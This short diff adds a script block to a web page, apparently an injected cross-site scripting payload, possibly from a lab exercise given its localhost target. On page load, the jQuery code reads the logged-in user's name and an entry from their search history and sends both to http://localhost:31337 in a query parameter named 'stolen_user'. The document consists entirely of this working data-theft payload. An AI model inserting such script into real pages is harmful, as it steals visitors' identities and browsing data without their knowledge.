@@ -1,0 +1,5 @@
+<script>
+	$(function(){
+		$.get(`http://localhost:31337/?stolen_user=${$('#logged-in-user').text()}&last_search=${$('.history-item:eq(1)').text()}`);
+	});
+</script>
